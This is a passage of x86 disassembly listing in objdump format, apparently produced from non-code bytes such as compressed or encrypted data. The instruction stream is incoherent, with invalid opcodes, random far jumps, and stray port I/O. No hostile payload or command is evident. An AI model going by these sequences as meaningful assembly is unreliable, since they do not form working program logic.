  41cd2d:	icebp  
  41cd2e:	cmp    ah,BYTE PTR [edi]
  41cd30:	dec    esp
  41cd31:	pop    ebx
  41cd32:	dec    ebx
  41cd33:	xor    DWORD PTR [eax],esi
  41cd35:	clc    
  41cd36:	inc    edx
  41cd37:	cmp    edi,DWORD PTR [esi]
  41cd39:	cld    
  41cd3a:	cmp    al,0x28
  41cd3c:	sub    al,0xf8
  41cd3e:	sbb    eax,0xdf32a04
  41cd43:	das    
  41cd44:	stc    
  41cd45:	in     eax,dx
  41cd46:	out    0x22,al
  41cd48:	and    dl,bh
  41cd4a:	add    esi,DWORD PTR [eax]
  41cd4c:	cvtdq2ps xmm1,XMMWORD PTR [edx]
  41cd4f:	sub    al,0xe1
  41cd51:	in     al,dx
  41cd52:	or     ch,BYTE PTR [ebx]
  41cd54:	fstp   QWORD PTR [edx+0xb]
  41cd57:	and    esp,eax
  41cd59:	repz add esi,DWORD PTR [eax]
  41cd5c:	ds sub al,0x18
  41cd5f:	repz adc BYTE PTR [ebx-0x2f],bl
  41cd63:	es call 0xdd6b8d59
  41cd69:	in     al,dx
  41cd6a:	out    0x34,al
  41cd6c:	loope  0x41cd5e
  41cd6e:	int    0x2f
  41cd70:	fstp   QWORD PTR [edx-0x31]
  41cd73:	and    ch,BYTE PTR [eax+0x65c7fff1]
  41cd79:	pop    ebx
  41cd7a:	outs   dx,DWORD PTR ds:[esi]
  41cd7b:	enter  0xe66b,0x70
  41cd7f:	mov    eax,ds:0x995ef33d
  41cd84:	dec    ebp
  41cd85:	call   0x425189
	...
  41cdb2:	pop    esp
  41cdb3:	out    0x71,eax
  41cdb5:	add    BYTE PTR [ebp+0x5b],0x70
  41cdb9:	mov    BYTE PTR [edx-0x16],cl
  41cdbc:	inc    DWORD PTR [edi-0x77a0ffe4]
  41cdc2:	sbb    al,0x5b
  41cdc4:	ss mov ah,0xf1
  41cdc7:	sub    esi,DWORD PTR [edx]
  41cdc9:	sbb    BYTE PTR [edx],bh
  41cdcb:	add    BYTE PTR [ebx+0x48],ch
  41cdce:	sub    bh,dh
  41cdd0:	pop    esi
  41cdd1:	jmp    0x41b5bbf9
  41cdd6:	sbb    esi,ecx
  41cdd8:	fs jmp 0x46afc5f6
  41cdde:	addr16 in eax,dx
  41cde0:	inc    DWORD PTR [ebx+0x61]
  41cde3:	out    0x67,eax
  41cde5:	inc    esp
  41cde6:	ins    BYTE PTR es:[edi],dx
  41cde7:	pop    ebx
  41cde8:	jno    0x41ce01
  41cdea:	push   ecx
  41cdeb:	out    dx,al
  41cdec:	outs   dx,DWORD PTR ds:[esi]
  41cded:	and    BYTE PTR [edx-0xb],al
  41cdf0:	bound  ebx,QWORD PTR [edx]
  41cdf2:	dec    ebp
  41cdf3:	clc    
  41cdf4:	pusha  
  41cdf5:	or     BYTE PTR [edx-0x1a],al
  41cdf8:	bound  edx,QWORD PTR ds:0x46aee5d
  41cdfe:	inc    edx
  41cdff:	jmp    0x41ce6d
  41ce01:	add    ah,BYTE PTR [edi]
  41ce03:	hlt    
  41ce04:	ins    BYTE PTR es:[edi],dx
  41ce05:	(bad)  
  41ce06:	cmp    eax,0x2bd66bf8
  41ce0b:	cld    
  41ce0c:	jbe    0x41cddc
  41ce0e:	push   ss
  41ce0f:	xor    BYTE PTR [eax],al
  41ce11:	sbb    BYTE PTR [ebx+0x31],cl
  41ce14:	das    
  41ce15:	sbb    BYTE PTR [eax],al
	...
  41ce3f:	add    BYTE PTR [edx-0xc],al
  41ce42:	jb     0x41ce44
  41ce44:	test   BYTE PTR [eax],ch
  41ce46:	pop    ebp
  41ce47:	outs   dx,BYTE PTR ds:[esi]
  41ce48:	add    BYTE PTR [eax+ebp*2+0x65],bl
  41ce4c:	sti    
  41ce4d:	sub    ebp,DWORD PTR [ecx+0x65]
  41ce50:	pop    ss
  41ce51:	xor    dh,BYTE PTR [ecx+0x73]
  41ce54:	ret    
  41ce55:	outs   dx,BYTE PTR cs:[esi]
  41ce57:	add    BYTE PTR [ebp-0x419290ca],ch
  41ce5d:	sub    eax,0x2a880061
  41ce62:	pop    ebp
  41ce63:	outs   dx,BYTE PTR ds:[esi]
  41ce64:	mov    al,0x32
  41ce66:	add    BYTE PTR [edx+eax*8+0x2c],dh
  41ce6a:	je     0x41ced5
  41ce6c:	mov    ecx,0x67610038
  41ce71:	sub    al,0x6c
  41ce73:	xlat   BYTE PTR gs:[ebx]
  41ce75:	sub    ah,BYTE PTR [ebp+0x63]
  41ce78:	outs   dx,DWORD PTR ds:[esi]
  41ce79:	xor    ch,BYTE PTR [esp+ebp*2-0x7e]
  41ce7d:	push   edi
  41ce7e:	jo     0x41cee5
  41ce80:	jbe    0x41cebe
  41ce82:	popa   
  41ce83:	add    BYTE PTR [edx+esi*1],al
  41ce86:	pop    edi
  41ce87:	jb     0x41ce8b
  41ce89:	and    eax,DWORD PTR [eax]
  41ce8b:	xor    DWORD PTR [edi-0xb9e8dc8],esp
  41ce91:	xor    DWORD PTR [eax],eax
  41ce93:	ja     0x41cee3
  41ce95:	sub    ebp,DWORD PTR [ecx+ebp*2+0x46]
  41ce99:	sub    al,BYTE PTR [eax]
  41ce9b:	imul   edi,DWORD PTR [ebx],0x2e657630
  41cea1:	xor    BYTE PTR [ecx+0x32],dh
	...
  41cecc:	add    BYTE PTR [eax],al
  41cece:	xchg   edi,eax
  41cecf:	sub    eax,0x2b486365
  41ced4:	popa   
  41ced5:	add    BYTE PTR [ecx-0x4ec9cc9b],dh
  41cedb:	gs std 
  41cedd:	ins    BYTE PTR es:[edi],dx
  41cede:	xor    BYTE PTR ds:0x5b896966,0x63
  41cee5:	popa   
  41cee6:	ds jle 0x41cf11
  41cee9:	jne    0x41ceca
  41ceeb:	mov    al,BYTE PTR [ecx]
  41ceed:	retfw  
  41ceef:	xchg   esp,eax
  41cef0:	sub    dh,BYTE PTR [edi-0x57]
  41cef3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cef4:	hlt    
  41cef5:	call   FWORD PTR [esi-0x6697cd5f]
  41cefb:	mov    al,ds:0xd3960028
  41cf00:	sub    DWORD PTR [edi-0x5a],ebx
  41cf03:	rol    DWORD PTR [ecx],cl
  41cf05:	jo     0x41cea8
  41cf07:	aad    0x31
  41cf09:	add    BYTE PTR [eax+eiz*8-0x34728ed9],bl
  41cf10:	sub    esp,DWORD PTR [ebp+0x3e]
  41cf13:	shr    BYTE PTR ds:0x2dd2665f,cl
  41cf19:	pop    edi
  41cf1a:	push   esi
  41cf1b:	je     0x41cf4d
  41cf1d:	ja     0x41cf8c
  41cf1f:	add    al,0x21
  41cf21:	popa   
  41cf22:	arpl   WORD PTR [ebx+0x4],ax
  41cf25:	imul   ebx,DWORD PTR [edi+0x0],0x38
  41cf29:	push   0x61040563
  41cf2e:	pop    edi
  41cf2f:	push   es
  41cf30:	and    DWORD PTR [eax+eax*1+0x0],esp
	...
  41cf5c:	pop    ds
  41cf5d:	je     0x41cf8f
  41cf5f:	and    bl,BYTE PTR ds:0x7225
  41cf64:	and    ch,BYTE PTR ds:[ebx]
  41cf67:	bound  ebx,QWORD PTR [ebx]
  41cf69:	inc    edx
  41cf6a:	cmp    BYTE PTR [eax],al
  41cf6c:	and    BYTE PTR [ebp+0x32],cl
  41cf6f:	arpl   WORD PTR [eax],cx
  41cf71:	dec    edi
  41cf72:	xor    al,BYTE PTR [eax]
  41cf74:	pop    ds
  41cf75:	inc    ecx
  41cf76:	sub    BYTE PTR [esi+0x19],ah
  41cf79:	dec    esp
  41cf7a:	add    al,0x72
  41cf7c:	fist   WORD PTR [eax+0x2c]
  41cf7f:	arpl   dx,sp
  41cf81:	jae    0x41cfb2
  41cf83:	pop    edi
  41cf84:	xlat   BYTE PTR ds:[ebx]
  41cf85:	pop    ebp
  41cf86:	pop    ds
  41cf87:	ins    DWORD PTR es:[edi],dx
  41cf88:	jmp    0xcd66b6e7
  41cf8d:	repz shl BYTE PTR [edx],cl
  41cf90:	int3   
  41cf91:	pop    edx
  41cf92:	xlat   BYTE PTR ds:[ebx]
  41cf93:	es jmp 0x3e79a385
  41cf99:	stc    
  41cf9a:	(bad)  
  41cf9b:	aaa    
  41cf9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf9d:	cld    
  41cf9e:	int3   
  41cf9f:	add    ebx,DWORD PTR [edi-0x5ed73a12]
  41cfa5:	clc    
  41cfa6:	out    0x21,al
  41cfa8:	xor    esp,0x5b912692
  41cfae:	call   0x5931:0x8bfa9f2c
  41cfb5:	pop    ebx
  41cfb6:	jl     0x41cfe2
  41cfb8:	lahf   
  41cfb9:	repnz mov edi,DWORD PTR [edx]
  41cfbc:	ds stc 
  41cfbe:	(bad)  
  41cfbf:	aaa    
	...
  41cfe8:	add    BYTE PTR [eax],al
  41cfea:	pop    ebp
  41cfeb:	lock mov eax,DWORD PTR [ebx]
  41cfee:	push   esi
  41cfef:	clc    
  41cff0:	jp     0x41d021
  41cff2:	push   ebx
  41cff3:	sub    al,0xe7
  41cff5:	es gs hlt 
  41cff8:	dec    esp
  41cff9:	daa    
  41cffa:	gs pop ebx
  41cffc:	dec    ebx
  41cffd:	and    edx,DWORD PTR [edi-0x12]
  41d000:	push   edx
  41d001:	and    edi,DWORD PTR [esi]
  41d003:	jmp    0x2c32:0xed192f47
  41d00a:	adc    DWORD PTR [ebx+0x4a],ebx
  41d00d:	sub    eax,0x3347eb15
  41d012:	test   DWORD PTR ds:[edi],0xcee2523
  41d019:	sub    BYTE PTR [esi],bh
  41d01b:	out    0x7,eax
  41d01d:	cmp    ebx,DWORD PTR [edx]
  41d01f:	out    dx,al
  41d020:	sbb    BYTE PTR [eax+ebx*1],al
  41d023:	out    dx,al
  41d024:	clc    
  41d025:	ss in  eax,0x5a
  41d028:	adc    DWORD PTR ds:0xb9ffece6,ebp
  41d02e:	ins    BYTE PTR es:[edi],dx
  41d02f:	daa    
  41d030:	add    bl,bh
  41d032:	adc    al,0xfc
  41d034:	addr16 enter 0xf70f,0xff
  41d039:	retf   0xf621
  41d03c:	ins    DWORD PTR es:[edi],dx
  41d03d:	ret    0x254c
  41d040:	xor    ch,cl
  41d042:	or     eax,0x65ca5efa
  41d047:	clc    
  41d048:	jo     0x41d033
  41d04a:	pop    esi
  41d04b:	out    dx,al
  41d04c:	ins    BYTE PTR es:[edi],dx
  41d04d:	lds    eax,FWORD PTR [eax]
	...
  41d077:	add    BYTE PTR ds:0x6abe6bf5,bh
  41d07d:	clc    
  41d07e:	jno    0x41d069
  41d080:	dec    esi
  41d081:	cli    
  41d082:	ins    BYTE PTR es:[edi],dx
  41d083:	mov    cs,WORD PTR [ecx-0x8]
  41d086:	jno    0x41d071
  41d088:	pop    edi
  41d089:	cld    
  41d08a:	ins    DWORD PTR es:[edi],dx
  41d08b:	mov    BYTE PTR [ebx-0x4],dl
  41d08e:	call   DWORD PTR [edx+0x7a62f01c]
  41d094:	cmp    eax,0x238d70fc
  41d099:	cld    
  41d09a:	jo     0x41d021
  41d09c:	sbb    ebx,DWORD PTR [ebx+0x76]
  41d09f:	push   eax
  41d0a0:	and    edi,esp
  41d0a2:	ins    BYTE PTR es:[edi],dx
  41d0a3:	pop    ebx
  41d0a4:	adc    ebx,DWORD PTR [ebx+0x6c]
  41d0a7:	inc    esi
  41d0a8:	adc    al,0xf7
  41d0aa:	ins    BYTE PTR es:[edi],dx
  41d0ab:	aas    
  41d0ac:	cmp    ch,BYTE PTR [edx+esi*1]
  41d0af:	cli    
  41d0b0:	jb     0x41d098
  41d0b2:	(bad)  
  41d0b3:	jmp    0xfa72fb62
  41d0b8:	mov    bl,0x2d
  41d0ba:	add    BYTE PTR [edx],bh
  41d0bc:	outs   dx,BYTE PTR ds:[esi]
  41d0bd:	cld    
  41d0be:	jno    0x41d0dd
  41d0c0:	push   eax
  41d0c1:	clc    
  41d0c2:	push   0x6cf85ce9
  41d0c7:	sbb    ebx,DWORD PTR [ebp-0x8]
  41d0ca:	call   DWORD PTR ds:0x6ded53
  41d0d0:	dec    edx
  41d0d1:	and    eax,0x38466d00
  41d0d6:	arpl   WORD PTR [ecx+0x3a],bp
  41d0d9:	push   edi
  41d0da:	je     0x41d14e
	...
  41d104:	add    BYTE PTR [eax],al
  41d106:	xor    DWORD PTR ds:[ebp+0x74],esp
  41d10a:	pop    esi
  41d10b:	pop    eax
  41d10c:	imul   ebp,DWORD PTR [esi-0x7d],0x2f
  41d110:	outs   dx,BYTE PTR ds:[esi]
  41d111:	gs push edi
  41d113:	addr16 das 
  41d115:	xor    esi,DWORD PTR [esi+0x36]
  41d118:	pop    edi
  41d119:	add    BYTE PTR [eax+esi*1],al
  41d11c:	arpl   WORD PTR gs:[ebx+edi*1],cx
  41d120:	outs   dx,BYTE PTR ds:[esi]
  41d121:	add    ch,bh
  41d123:	sub    ch,BYTE PTR [esi+0x69]
  41d126:	loopne 0x41d14d
  41d128:	add    BYTE PTR [ebx-0x51],ah
  41d12b:	and    eax,0x28277365
  41d130:	pop    ebp
  41d131:	jae    0x41d0d7
  41d133:	sub    BYTE PTR [eax],dh
  41d135:	jb     0x41d0f2
  41d137:	push   edi
  41d138:	pop    ebp
  41d139:	jne    0x41d1af
  41d13b:	sub    al,0x65
  41d13d:	outs   dx,BYTE PTR ds:[esi]
  41d13e:	out    0x24,eax
  41d140:	jo     0x41d1a3
  41d142:	gs sub eax,0x3bb60075
  41d148:	imul   ebp,DWORD PTR [ecx+0x71],0x75656957
  41d14f:	xor    esp,DWORD PTR [ebp+0x6e]
  41d152:	xlat   BYTE PTR ds:[ebx]
  41d153:	cmp    BYTE PTR [ebx+0x6f],ch
  41d156:	js     0x41d18b
  41d158:	popa   
  41d159:	add    BYTE PTR [ecx],cl
  41d15b:	and    eax,0x3b016565
  41d160:	outs   dx,DWORD PTR ds:[esi]
  41d161:	add    bh,bh
  41d163:	das    
  41d164:	jo     0x41d1cb
  41d166:	xchg   edi,eax
  41d167:	and    al,0x68
  41d169:	popa   
	...
  41d192:	add    BYTE PTR [eax],al
  41d194:	xor    esi,DWORD PTR [eax]
  41d196:	imul   eax,DWORD PTR [eax],0x746e2e41
  41d19c:	ds dec edi
  41d19e:	sub    ah,BYTE PTR [ecx+edx*1+0x72]
  41d1a2:	and    eax,0x2b48e96d
  41d1a7:	outs   dx,BYTE PTR ds:[esi]
  41d1a8:	fnstenv [ecx+0x29]
  41d1ab:	pop    edi
  41d1ac:	in     al,dx
  41d1ad:	push   ebp
  41d1ae:	pop    ds
  41d1af:	ja     0x41d1ef
  41d1b1:	popa   
  41d1b2:	sub    BYTE PTR [ebp-0x1b],ch
  41d1b5:	mov    ?,WORD PTR [eax+eax*1]
  41d1b8:	or     DWORD PTR [ebp-0xf],eax
  41d1bb:	xor    al,0x3e
  41d1bd:	cwde   
  41d1be:	sub    dh,BYTE PTR [ecx-0x25]
  41d1c1:	sub    DWORD PTR [ecx],0x2617aa00
  41d1c7:	imul   esi,DWORD PTR [edi-0x5e98e2bc],0x925f2d1b
  41d1d1:	inc    esp
  41d1d2:	and    al,0x0
  41d1d4:	xchg   edx,eax
  41d1d5:	in     al,dx
  41d1d6:	das    
  41d1d7:	outs   dx,BYTE PTR ds:[esi]
  41d1d8:	call   0x2bf4:0x8d0032df
  41d1df:	jb     0x41d178
  41d1e1:	lock add BYTE PTR [edx+0x5f],ah
  41d1e5:	repnz sbb al,0x67
  41d1e8:	push   0x44
  41d1ea:	and    BYTE PTR [esi+0x72],ch
  41d1ed:	out    0x32,eax
  41d1ef:	add    BYTE PTR [edi-0x26],bl
  41d1f2:	sub    eax,0x39b26968
	...
  41d21f:	add    BYTE PTR [eax],al
  41d221:	add    BYTE PTR [ebp-0x57],bl
  41d224:	ss jbe 0x41d28a
  41d227:	mov    eax,0x9c3e6330
  41d22c:	daa    
  41d22d:	popa   
  41d22e:	and    eax,0x2e0039a7
  41d233:	test   eax,0x442c632f
  41d238:	and    esp,DWORD PTR [ebx+0x10]
  41d23b:	sahf   
  41d23c:	and    DWORD PTR [ebx+0x27],ebp
  41d23f:	pop    ebx
  41d240:	adc    eax,0xec71904
  41d245:	xor    bl,BYTE PTR ds:0x212f06d4
  41d24b:	pop    ebx
  41d24c:	fdiv   DWORD PTR [edx]
  41d24e:	sub    al,0xd2
  41d250:	mov    edx,0x10d13e1e
  41d255:	xor    al,0xdd
  41d257:	int3   
  41d258:	out    0x20,eax
  41d25a:	(bad)  
  41d25c:	add    al,0x35
  41d25e:	loope  0x41d22d
  41d260:	out    0x2c,eax
  41d262:	loopne 0x41d227
  41d264:	(bad)  
  41d265:	sub    edx,edx
  41d267:	pop    edx
  41d268:	fdiv   DWORD PTR [eax]
  41d26a:	(bad)  
  41d26c:	sar    DWORD PTR [edx],cl
  41d26e:	imul   ebx,DWORD PTR [ebx-0x36],0xb3bc9d35
  41d275:	sub    dh,BYTE PTR [eax-0x6cde1840]
  41d27b:	retf   0x22c9
  41d27e:	mov    WORD PTR [ebx-0x78],ds
  41d281:	pop    ds
  41d282:	cdq    
  41d283:	mov    edi,0x3488
	...
  41d2b0:	ds int 0x86
  41d2b3:	das    
  41d2b4:	cdq    
  41d2b5:	enter  0x380,0x6f
  41d2b9:	(bad)  
  41d2ba:	mov    BYTE PTR [edx],bh
  41d2bc:	pop    ebp
  41d2bd:	int    0xe7
  41d2bf:	xor    BYTE PTR [ecx-0x32],ah
  41d2c2:	mov    ebp,DWORD PTR [eax]
  41d2c4:	push   ebp
  41d2c5:	pop    ebx
  41d2c6:	ja     0x41d2fd
  41d2c8:	jns    0x41d28e
  41d2ca:	pop    edx
  41d2cb:	pop    ds
  41d2cc:	ds aad 0x5f
  41d2cf:	and    eax,0x2745bd50
  41d2d4:	ds into 
  41d2d6:	dec    eax
  41d2d7:	daa    
  41d2d8:	sub    eax,0x250453c0
  41d2dd:	les    edx,FWORD PTR [edx+0x1f]
  41d2e0:	ds mov edi,0xc7564800
  41d2e6:	pop    edi
  41d2e7:	cmp    al,BYTE PTR [edx-0x40]
  41d2ea:	jb     0x41d2f8
  41d2ec:	xor    ecx,ecx
  41d2ee:	add    BYTE PTR ds:0x1d74cc29,dl
  41d2f4:	and    esp,ecx
  41d2f6:	je     0x41d2e1
  41d2f8:	and    BYTE PTR [edx-0x3dd7f38a],bh
  41d2fe:	popa   
  41d2ff:	adc    al,BYTE PTR [edx-0x38]
  41d302:	outs   dx,BYTE PTR ds:[esi]
  41d303:	or     al,0x16
  41d305:	enter  0x476,0x42
  41d309:	mov    edi,0xbf24df5f
  41d30e:	add    ah,cl
  41d310:	add    al,0xc7
  41d312:	ins    DWORD PTR es:[edi],dx
  41d313:	fild   WORD PTR [eax]
	...
  41d33d:	add    BYTE PTR [eax],ah
  41d33f:	pop    ebx
  41d340:	popa   
  41d341:	shr    DWORD PTR [eax-0x33],0x61
  41d345:	sar    DWORD PTR ds:0x48d072c1,1
  41d34b:	leave  
  41d34c:	fs jmp 0xe9a699b0
  41d352:	cmp    DWORD PTR [ecx+esi*2+0x77c9649d],edi
  41d359:	jmp    0x8cb099b5
  41d35e:	cmp    eax,0x338a67c4
  41d363:	(bad)  
  41d364:	jno    0x41d2fc
  41d366:	pop    ds
  41d367:	iret   
  41d368:	add    BYTE PTR [ebx-0x44cd750d],bh
  41d36e:	jmp    0x41d3c8
  41d370:	pop    edi
  41d371:	je     0x41d396
  41d373:	mov    ebp,0x5b0d4c6c
  41d378:	das    
  41d379:	sbb    bl,dl
  41d37b:	mov    DWORD PTR [edi],ebp
  41d37d:	sbb    bl,cl
  41d37f:	mov    DWORD PTR [eax],eax
  41d381:	dec    edx
  41d382:	popa   
  41d383:	mov    edx,0x8004005f
  41d388:	ins    BYTE PTR es:[edi],dx
  41d389:	popa   
  41d38a:	xchg   edi,eax
  41d38b:	sub    BYTE PTR [ebx+0x72],0xf3
  41d38f:	jge    0x41d3ff
  41d391:	xor    dl,BYTE PTR [esp+ebx*2-0x76d7939b]
  41d398:	popa   
  41d399:	cmp    BYTE PTR [bp+di+0x0],bh
  41d39d:	data16 cmp BYTE PTR [eax+0x6274],al
	...
  41d3cc:	inc    esi
  41d3cd:	sub    DWORD PTR [ecx+esi*1+0x67],0xffffff80
  41d3d2:	imul   esi,DWORD PTR [esi+0x4e],0xffffff81
  41d3d6:	arpl   WORD PTR [eax],ax
  41d3d8:	cmp    DWORD PTR [esi+0x74],edi
  41d3db:	push   0x65008146
  41d3e0:	push   0xffffff83
  41d3e2:	pop    ebp
  41d3e3:	outs   dx,BYTE PTR ds:[esi]
  41d3e4:	jb     0x41d461
  41d3e6:	ins    BYTE PTR es:[edi],dx
  41d3e7:	add    BYTE PTR [ebp+edi*2+0x6b],ah
  41d3eb:	outs   dx,DWORD PTR ds:[esi]
  41d3ec:	add    eax,0xf2660097
  41d3f1:	jl     0x41d45a
  41d3f3:	outs   dx,DWORD PTR ds:[esi]
  41d3f4:	add    DWORD PTR [esi+0x0],esi
  41d3f7:	jae    0x41d3ef
  41d3f9:	sub    BYTE PTR [ecx+0x79],0x27
  41d3fd:	sbb    DWORD PTR [ebp+0x78],0xffffffb0
  41d401:	jp     0x41d46f
  41d403:	ins    BYTE PTR es:[edi],dx
  41d404:	pop    ss
  41d405:	sbb    BYTE PTR [ebp+0x73],0xb8
  41d409:	jge    0x41d40b
  41d40b:	push   0x78
  41d40d:	test   BYTE PTR [esi+0x0],ch
  41d410:	mov    dh,0x8e
  41d412:	xor    dh,BYTE PTR [edi-0x5c]
  41d415:	jp     0x41d44b
  41d417:	jb     0x41d3f0
  41d419:	jns    0x41d478
  41d41b:	bound  ecx,QWORD PTR [esi+0x5c]
  41d41e:	jb     0x41d485
  41d420:	or     DWORD PTR [esi+0x2f],0x33
  41d424:	xlat   BYTE PTR ds:[ebx]
  41d425:	jns    0x41d493
  41d427:	popa   
  41d428:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d42a:	sub    BYTE PTR [edi+0x3e],bl
  41d42d:	mov    dl,0x32
  41d42f:	add    BYTE PTR [bx+si],al
	...
  41d45a:	and    BYTE PTR [ebp-0x6ed0ffe1],ah
  41d460:	pop    ds
  41d461:	jb     0x41d48d
  41d463:	inc    edx
  41d464:	and    ch,BYTE PTR [eax+0x23]
  41d467:	xchg   esi,eax
  41d468:	xor    DWORD PTR [ebx+0x1f],esp
  41d46b:	inc    edx
  41d46c:	lock xor dl,BYTE PTR [ebx+0x2f]
  41d470:	lock call FWORD PTR [esi]
  41d473:	pusha  
  41d474:	sbb    eax,0x132ea63
  41d479:	push   0x611d53df
  41d47e:	fst    DWORD PTR [ebx+0x20]
  41d481:	add    dl,bl
  41d483:	data16 cmp al,0x74
  41d486:	jecxz  0x41d4db
  41d488:	add    DWORD PTR [ecx-0x21],esi
  41d48b:	aaa    
  41d48c:	and    BYTE PTR [esi+edi*1+0x73],ah
  41d490:	repz xor DWORD PTR [esi*2+0x23a1fff1],ecx
  41d498:	and    eax,0x2744a16c
  41d49d:	pop    edi
  41d49e:	lods   eax,DWORD PTR ds:[esi]
  41d49f:	adc    al,0x20
  41d4a1:	jb     0x41d4e1
  41d4a3:	sub    BYTE PTR [esi+ebp*2],ah
  41d4a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d4a7:	pop    ds
  41d4a8:	and    eax,0x2a449b6c
  41d4ad:	addr16 xchg edx,eax
  41d4af:	lock pop ds
  41d4b1:	outs   dx,BYTE PTR ds:[esi]
  41d4b2:	ds loope 0x41d4d8
  41d4b5:	jno    0x41d524
  41d4b7:	fistp  DWORD PTR [edi]
  41d4b9:	add    BYTE PTR [ebp-0x28],ch
  41d4bc:	and    BYTE PTR [eax+eax*1+0x0],ch
	...
  41d4e8:	pop    edx
  41d4e9:	jecxz  0x41d4eb
  41d4eb:	jo     0x41d559
  41d4ed:	jecxz  0x41d52a
  41d4ef:	arpl   WORD PTR [esp+eax*2+0x29],cx
  41d4f3:	ins    DWORD PTR es:[edi],dx
  41d4f4:	dec    edx
  41d4f5:	pop    ebx
  41d4f6:	dec    ebx
  41d4f7:	and    eax,0x2b565b63
  41d4fc:	push   eax
  41d4fd:	mov    edi,0x5b2f2d46
  41d502:	cmp    al,0x2f
  41d504:	das    
  41d505:	iret   
  41d506:	dec    ebx
  41d507:	sub    ebx,DWORD PTR ds:0x2a23465b
  41d50d:	sar    BYTE PTR [edx],0x4
  41d510:	sbb    al,0xc4
  41d512:	cmp    ebp,DWORD PTR [eax]
  41d514:	sbb    edi,DWORD PTR [ebx+ebx*1+0x65b0f1f]
  41d51b:	sub    al,0x1c
  41d51d:	mov    edi,0xbe3e261b
  41d522:	add    eax,0x14c1e42c
  41d527:	add    al,0x19
  41d529:	mov    DWORD PTR [edx-0x4172d311],edi
  41d52f:	sti    
  41d530:	adc    BYTE PTR [ebx-0x3122fc19],cl
  41d536:	loop   0x41d569
  41d538:	rol    cl,1
  41d53a:	into   
  41d53b:	xor    eax,edx
  41d53d:	int    0xdc
  41d53f:	add    esp,DWORD PTR [esi+0x7433d3cf]
  41d545:	xchg   BYTE PTR [esi],dl
  41d547:	out    dx,al
  41d548:	jae    0x41d4cf
  41d54a:	clc    
  41d54b:	in     al,dx
	...
  41d574:	add    BYTE PTR [eax],al
  41d576:	ins    BYTE PTR es:[edi],dx
  41d577:	test   ecx,edi
  41d579:	repnz dec edi
  41d57b:	test   ecx,edi
  41d57d:	out    dx,al
  41d57e:	(bad)  
  41d57f:	retf   
  41d580:	xchg   esi,eax
  41d581:	and    eax,0x22868691
  41d586:	mov    al,al
  41d588:	lds    esi,FWORD PTR [ebx]
  41d58a:	retfw  
  41d58c:	out    0x2b,eax
  41d58e:	push   0xffffffcf
  41d590:	ja     0x41d58b
  41d592:	sbb    al,BYTE PTR [esi-0x73ec054b]
  41d598:	add    BYTE PTR [eax-0x4fd07817],dh
  41d59e:	loope  0x41d527
  41d5a0:	xor    bl,BYTE PTR [edx]
  41d5a2:	retf   0x7086
  41d5a5:	dec    esi
  41d5a6:	sbb    dh,cl
  41d5a8:	sub    eax,0x63cf5d4e
  41d5ad:	jmp    FWORD PTR [ebp-0x3d]
  41d5b0:	jo     0x41d59b
  41d5b2:	cmp    eax,0x6a3574c3
  41d5b7:	xchg   ecx,eax
  41d5b8:	sub    eax,0x76bf6906
  41d5bd:	inc    esp
  41d5be:	addr16 int3 
  41d5c0:	ins    BYTE PTR es:[edi],dx
  41d5c1:	adc    BYTE PTR [eax-0x40],ah
  41d5c4:	or     bl,BYTE PTR cs:[ebp-0x41]
  41d5c8:	arpl   WORD PTR [edx],bx
  41d5ca:	and    eax,0x1b076ec0
  41d5cf:	leave  
  41d5d0:	imul   edx,edi,0x49
  41d5d3:	les    ebp,FWORD PTR ds:0x589d2204
  41d5d9:	mov    DWORD PTR [eax],0x0
	...
  41d603:	add    BYTE PTR [eax],bh
  41d605:	shl    DWORD PTR [ebx-0x17],cl
  41d608:	and    eax,0x47d974cf
  41d60d:	xchg   BYTE PTR ds:0x74c71ccc,ch
  41d613:	int3   
  41d614:	ins    DWORD PTR es:[edi],dx
  41d615:	mov    eax,0x8558c468
  41d61a:	gs (bad) 
  41d61c:	pop    ebx
  41d61d:	test   DWORD PTR [ebx+edi*4+0x1a],esi
  41d621:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d622:	outs   dx,BYTE PTR ds:[esi]
  41d623:	retf   0xcc0c
  41d626:	push   edi
  41d627:	push   DWORD PTR [eax]
  41d629:	shl    DWORD PTR [ebx-0x17],cl
  41d62c:	cmp    eax,0x6db053ac
  41d631:	scas   al,BYTE PTR es:[edi]
  41d632:	inc    esp
  41d633:	scas   eax,DWORD PTR es:[edi]
  41d634:	test   BYTE PTR [edi-0x576b26bd],ah
  41d63a:	inc    edi
  41d63b:	add    bh,al
  41d63d:	mov    ds:0x9cae4644,eax
  41d642:	inc    ecx
  41d643:	xor    BYTE PTR [esi-0x4abcba5b],ch
  41d649:	mov    cl,0x50
  41d64b:	push   esp
  41d64c:	sbb    ah,BYTE PTR [ebx-0x69f5a6d0]
  41d652:	sub    eax,0x5f572e
  41d657:	add    BYTE PTR [edi+0x72000258],ah
  41d65d:	cwde   
  41d65e:	inc    esp
  41d65f:	push   ebp
  41d660:	xchg   esi,eax
  41d661:	pop    edi
  41d662:	add    BYTE PTR [eax],al
  41d664:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d665:	pop    eax
	...
  41d692:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d693:	pop    eax
  41d694:	dec    edi
  41d695:	dec    edi
  41d696:	pop    ecx
  41d697:	mov    bl,0x53
  41d699:	inc    ecx
  41d69a:	inc    ebp
  41d69b:	mov    ds:0x7c3e4d5c,al
  41d6a0:	jb     0x41d711
  41d6a2:	push   esp
  41d6a3:	js     0x41d70b
  41d6a5:	je     0x41d6ca
  41d6a7:	mov    al,0x65
  41d6a9:	outs   dx,BYTE PTR ds:[esi]
  41d6aa:	cmp    edi,DWORD PTR [eax+0x73]
  41d6ad:	jae    0x41d6e2
  41d6af:	pushf  
  41d6b0:	jno    0x41d724
  41d6b2:	push   ebp
  41d6b3:	sub    DWORD PTR [esi+0x74],0xffffff89
  41d6b7:	xor    DWORD PTR [edx+0x73],0x6e
  41d6bb:	jns    0x41d72b
  41d6bd:	pop    esp
  41d6be:	cli    
  41d6bf:	jns    0x41d726
  41d6c1:	outs   dx,BYTE PTR ds:[esi]
  41d6c2:	adc    al,0x8c
  41d6c4:	pop    ebp
  41d6c5:	ins    BYTE PTR es:[edi],dx
  41d6c6:	adc    ebx,DWORD PTR [eax+0x51]
  41d6c9:	outs   dx,BYTE PTR ds:[esi]
  41d6ca:	push   cs
  41d6cb:	jp     0x41d73c
